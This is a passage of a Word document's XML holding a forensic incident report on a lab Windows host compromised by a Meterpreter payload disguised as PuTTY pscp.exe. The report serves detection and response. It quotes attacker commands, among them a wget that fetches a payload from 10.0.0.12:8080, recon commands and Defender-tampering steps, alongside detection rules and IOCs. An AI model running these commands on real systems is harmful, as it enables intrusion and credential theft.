        <w:t>Hardening</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce Tamper Protection through Intune/MDE and stop local administrators from adding Defender exclusions or disabling RTP (via GPO, plus AllowUserUIAccess=0 and the 'Disable Local Admin Merge' policy).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Remove day-to-day local admin rights from users and set UAC to require credentials instead of consent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Turn on LSA Protection (RunAsPPL) and Credential Guard to block access to lsass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Apply application control (WDAC/AppLocker) that blocks execution from user-writable paths such as Downloads, C:\Payloads and %USERPROFILE%, plus SmartScreen enforcement for files carrying MOTW.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Expand the Sysmon configuration so EID 3 network connections are logged for every process (or at least explorer.exe and unsigned binaries), and keep EID 8/10 for lsass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Detection and monitoring</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert when Sysmon EID 1 shows explorer.exe whose parent is anything other than userinit.exe/winlogon.exe (sacrificial process spawned by an implant).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on Sysmon EID 8 CreateRemoteThread whose target is explorer.exe or lsass.exe and whose source is an unsigned or user-path binary, or explorer.exe itself.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on PowerShell 400/600/4103 with HostName=MSFConsole or a HostApplication other than powershell.exe/pwsh.exe (Meterpreter powershell extension), and on 4104 containing Invoke-DcSync.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on cmd.exe whose parent is explorer.exe and which runs a burst of recon LOLBins (tracert, quser, tasklist, netstat -ntb, whoami, net user) within a few minutes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on Defender 5001 (RTP disabled) and 5007 with a new Exclusions\Paths value, and on 1116 Meterpreter detections followed by the same file being written again.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hunt for the IOCs: SHA256 ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931, IMPHASH ADD361A4F3939AF38D11873F1D74BDED, OriginalFileName=PSCP from an unexpected path, and URL http://10.0.0.12:8080/*.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Further investigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Analyse the memory image (Volatility malfind/netscan) to find the real Meterpreter C2 socket and port, the injected regions in explorer.exe 7324 and in lsass, and any loaded kiwi/mimikatz modules.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pull firewall, NetFlow and proxy logs for 10.0.0.12 around 2023-11-10 10:15–11:45 UTC to confirm the session port and the volume transferred, and identify the other hosts that contacted it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hash test.exe, 1.exe and $RHOVDEL.exe and compare them with pscp.exe, then submit to VirusTotal and extract the payload configuration (LHOST/LPORT) with a Meterpreter config parser.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>If the host is domain-joined anywhere in the real environment, check DC logs for DCSync (4662 with replication GUIDs), since the Invoke-DcSync bootstrap was loaded, and look for any use of the medmondson or Administrator credentials on other machines.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Determine with the lab owner which Defender tampering steps (exclusion, RTP disable via the UI) were scenario staging and which were attacker actions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix A: Summary of the analysis steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1: System context and scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Host DESKTOP-KJ81A5A (formerly OOBE name WIN-ELL0II3NDSJ), Windows 10 Pro build 18362, installed 2023-11-09 11:02:48 UTC, TZ Pacific (bias 480). Single active admin user medmondson (SID ...-1001). VMware VM with Intel 82574L NIC, one network profile; Samsung T7 USB SSD (E:) attached 10:45:39–11:40:19 UTC. Sysmon 15.1 installed 10:51:10 UTC (telemetry start), Defender exclusion C:\Payloads\ at 10:52:49 (to pivot later). KAPE/gkape collection 11:21–12:31 UTC from Desktop\Tools (excluded). Findings F-001 (system description) and F-002 (scope limits) recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: No raw.native_wifi / native_panther tables available; Dissect job partial, SIDR warning; no Sysmon telemetry before 10:51:11 UTC; 4688 auditing not yet verified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2: Triage of automatic detections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Triaged all critical/high/medium detections (Hayabusa, Chainsaw, Zircolite) and verified source events in raw.evtx. True positives: (F-003) Defender 1116/1117 Trojan:Win64/Meterpreter.E on Downloads\pscp.exe from http://10.0.0.12:8080/pscp.exe at 10:16:43, 10:17:53, 10:19:36 UTC; (F-004) Defender tampering: SpyNet/sample submission off, TamperProtection toggled, exclusion C:\Payloads\ at 10:19:24, RTP disabled 10:19:46 and 11:02:12 (5001, Sysmon 13 DisableRealtimeMonitoring); (F-005) C:\Payloads\pscp.exe executed 11:03:09 (Sysmon 1 PID 2196 GUID {e6e9f951-0ded-654e-8f01-000000000500}, SHA256 ABBF7B5F…C6CF931, MD5 DED9E58D…5F1, PuTTY PSCP 0.79 version info = masquerade; Prefetch run 1) spawning explorer.exe PID 7324 {e6e9f951-0ded-654e-9001-000000000500} with CreateRemoteThread (migration), then explorer→lsass remote thread 11:03:56; (F-006) post-exploitation from explorer 7324: cmd 6600 → tracert x3, quser; MSFConsole PowerShell host in explorer.exe (Invoke-DcSync bootstrap) at 11:06:40; cmd 5848 → powershell 736 → wget http://10.0.0.12:8080/1.exe (Sysmon 3 to 10.0.0.12:8080) and tasklist. Related files C:\Payloads\test.exe and C:\Users\medmondson\1.exe (same size 986,624 B) show no execution evidence. IOCs I-001..I-006 and timeline T-001..T-007 recorded. FPs documented in note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: No Sysmon EID 3 for pscp.exe or explorer 7324: the Meterpreter C2 port is not yet established (pivot SRUM network usage, Sysmon 22, firewall/WFP logs in later steps). Hashes of test.exe/1.exe unavailable (no Amcache entries, no Sysmon 1); pscp.exe absent from Amcache. Purpose of the lsass remote thread is inferred. No offline hash set loaded (hash_hits empty).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 3: Program execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I checked program execution in Prefetch (231 files), Amcache files and programs, ShimCache, BAM, UserAssist, MUICache, PCA, SRUM (app timeline, resource use, network usage), Sysmon EID 1/3/8, PowerShell 4103/4104/800 and the PSReadLine history.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Malicious executable**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Payloads\pscp.exe ran at 2023-11-10 11:03:09 UTC. Its parent was medmondson's elevated PowerShell (PID 1088, GUID {e6e9f951-0de1-654e-8801-000000000500}), which the user's own explorer shell (GUID …0907-654e-5c00…) had started at 11:02:57.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Four independent sources show the run: Sysmon 1, Prefetch (PSCP.EXE-1DCA12FC, run count 1), SRUM (about 120 s duration, ending 11:17) and PowerShell 4104 plus PSReadLine (`.\pscp.exe`).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShimCache and $MFT show the file is present; its Zone.Identifier (ZoneId=3) points to http://10.0.0.12:8080/pscp.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- There is no Amcache or BAM entry for it.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Hashes: MD5 DED9E58DD95A88A4BEE89B74A65F05F1, SHA256 ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931, IMPHASH ADD361A4F3939AF38D11873F1D74BDED.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- It masquerades as PuTTY PSCP: version info reads "PuTTY suite", OriginalFileName "PSCP", "Release 0.79".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**New discovery commands (F-007)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- These come from cmd 5848, a child of the injected explorer.exe PID 7324: `netstat -ntb` at 11:12:23, `whoami /user` at 11:13:25, and `net user administrator` (which ran net1) at 11:13:35.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 1 and Prefetch both record them, each with run count 1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Payload copies with no sign of execution (F-009)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Payloads\test.exe was saved with `wget …/pscp.exe -o test.exe` at 10:21:41. C:\Users\medmondson\1.exe was downloaded at 11:10:55.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Both are 986,624 bytes, the same size as pscp.exe. No artifact shows either one ran.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Recorded so far**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Findings F-007, F-008 (execution origin and corroboration, critical/confirmed) and F-009.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Timeline events T-008 to T-010 and IOCs I-007 to I-010.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Answers to Q1, Q2, Q3, Q5, Q6, Q7 and Q8. Q6 gives the full ProcessGuid chain.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- A note listing the lab and analyst noise that was excluded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - **Q4 (C2 IP and port) is still unanswered.** Sysmon EID 3 did not log the pscp.exe or explorer 7324 Meterpreter session; only powershell 736 to 10.0.0.12 (port not yet pulled from the payload) is recorded. The port has to come from the network step: Sysmon 3 DestinationPort, the netstat output context, SRUM, and Security 5156 if it exists.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **No hashes for test.exe and 1.exe.** Neither has an Amcache or Sysmon 1 record, so they need to be hashed from disk to confirm they are the same file as pscp.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Defender history not re-checked.** Defender 1116/1117 events on test.exe were not reviewed in this step.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Sysmon coverage gap.** Sysmon only covers activity from 10:51 onward, so anything executed before that relies on Prefetch, SRUM and PSReadLine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 4: Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I checked all the persistence locations listed for this step and found no attacker persistence (F-010, info/probable).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**What was checked**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Services:** System 7045 and Security 4697 events, raw.reg_services and the Sysmon 13 ImagePath writes. All are lab setup or vendor installs: VMware, Mozilla, Sysmon, WPD, Defender.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Scheduled tasks:** 4698/4702 and TaskScheduler 106 events, raw.reg_taskcache and Sysmon 11 writes under System32\Tasks. The tasks belong to Firefox, Defender, OneDrive and EdgeUpdate, and svchost created all of them.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Run/RunOnce keys:** these come from a legitimate OneDrive self-update at 11:13:46. Its process chain is OneDrive.exe → OneDriveSetup.exe → EdgeUpdate, which is not the injected explorer.exe 7324 chain.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Other registry autostarts:** no Winlogon, IFEO or SilentProcessExit values were found. AppInit_DLLs is empty.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **COM:** the 31 HKCU CLSID entries are OneDrive/EdgeUpdate registrations.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Active Setup, print monitors/processors, BootExecute/SetupExecute:** all stock values.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **WMI:** the only 5861 event is the default SCM Event Log Filter.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Startup folders and hosts:** the Startup folders hold only desktop.ini, and the hosts file is unchanged since 2019.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Attacker processes:** pscp.exe, explorer 7324 and cmd 5848 made no Sysmon registry or WMI changes. Their only file writes were 1.exe, a PSScriptPolicyTest file and a CLR usage log.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Conclusion**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The Meterpreter session appears to have run in memory only, with no reboot persistence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - **Missing tables:** raw.native_startup, raw.native_hosts, raw.dissect_cim_consumerbindings and raw.dissect_msoffice_startup are not in the database. Startup folders and the hosts file were therefore checked through $MFT only, and WMI through the 5861 events only.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Sysmon coverage:** registry and file telemetry exists only from 10:51:11 UTC, so persistence created before then could only be checked in the registry and file-system state at collection time.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Partial Dissect job:** the Dissect job only partly completed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Not reviewed:** PendingFileRenameOperations was not found in the RECmd outputs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 5: Accounts, authentication and privileges</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I reviewed Security events 4624, 4625, 4634, 4647, 4648, 4672, the 47xx account-management events, and 4798/4799/4703. I also checked TerminalServices-LSM events 21–25 (there are no 1149 or 1024 events) and the SAM via recmd UserAccounts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Logons**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Every logon is local: type 2 interactive, or type 0/5 for SYSTEM and services.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- There are no type 3 or type 10 logons, no failed logons, no Kerberos or NTLM events, and no RDP.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The 4648 events are all OS logon-process behaviour to localhost.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Accounts**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only account changes are from OOBE on 2023-11-09:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - defaultuser0 and medmondson were created.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - medmondson was added to Administrators at 11:08:58.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - The OOBE events show an 18:58–19:00 clock offset, which is an artefact of setup.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SAM matches this: the built-in accounts are disabled and medmondson is the only enabled admin, with 7 logons and the last one at 2023-11-10 10:42:23 (F-011).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Attacker context (F-012)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Meterpreter chain ran as medmondson at High integrity under elevated LogonId 0x15347 (4624 at 10:42:10). That token came from UAC consent.exe at 11:02:56, followed by powershell 1088.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No process in the chain ran as SYSTEM, so there is no getsystem evidence.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Security 4798 at 11:13:35, with net1.exe PID 0x480 as caller and SubjectLogonId 0x15347, shows the local Administrator (RID 500) being enumerated. This corroborates F-007 and was added to it as evidence.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Administrator account was not enabled or modified afterwards.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Timeline events T-011 and T-012 and a user IOC were recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: I can't tell if lsass was actually dumped from the 11:03:56 remote thread. There's no credential-use evidence, and no logons happened after 10:42:23. There's no AD/DC telemetry for the Invoke-DcSync attempt: the host is in a workgroup, so no 4662 events exist.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 6: Remote access and lateral movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I reviewed remote access and lateral movement. Nothing shows the host was controlled remotely by anything other than the Meterpreter session, or used as a pivot (F-013).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Checked, all negative:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **RDP:** fDenyTSConnections=1; LSM shows only local sessions; there are no 1149, 4778/4779 or type 10 events; no mstsc MRU, .rdp files or bitmap cache.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **PsExec:** no PSEXESVC service and no 5140/5145. PsExec binaries exist only in the analyst toolset and have no Prefetch entry.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **WinRM:** no 6/91/168 events, no wsmprovhost and no ServerRemoteHost 400. The 142/145 events are benign listener enumeration.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Remote-access tools:** none installed. Their names appear only in KAPE targets and maps.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Shares:** no UNC ShellBags and no mapped drives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Network:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only Sysmon EID 3 in the attack chain is powershell 736 → 10.0.0.12:8080/tcp at 11:10:55 UTC (RecordID 336).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SRUM shows explorer.exe sending more outbound bytes (69 KB) in the interval ending 11:43, which fits C2 traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Recorded:** Q4 answered (10.0.0.12:8080, probable); IOC I-012 added; note on false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: Sysmon did not log the Meterpreter reverse socket of pscp.exe or explorer 7324, so the C2 port is inferred from the staging connection. The output of netstat -ntb was not collected, and there is no packet capture or firewall connection log (no 5156 events).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7: User activity on files and folders</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I reviewed these sources: LNK (24), Jump Lists (auto/custom), ShellBags (44), RecentDocs, OpenSavePidlMRU, LastVisitedPidlMRU, Windows Timeline, the SIDR file index, $MFT, $UsnJrnl, the Recycle Bin and the USB context.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**F-014 (medium, confirmed): payload file lifecycle**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Edge downloaded pscp.exe from 10.0.0.12:8080 to Downloads four times.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender deleted the first and third copies (USN FileDelete at 10:16:44 and 10:19:36). The download at 10:19:53 (MFT entry 85774) survived.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:20:10 it was copied to C:\Payloads\pscp.exe (MFT 85781, Zone.Identifier kept).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:20:20 the Downloads original went to the Recycle Bin as $RHOVDEL.exe and $IHOVDEL.exe. It is still allocated, so it can be recovered and hashed (IOC I-013).</w:t>
        <w:br/>
      </w:r>
      <w:r>
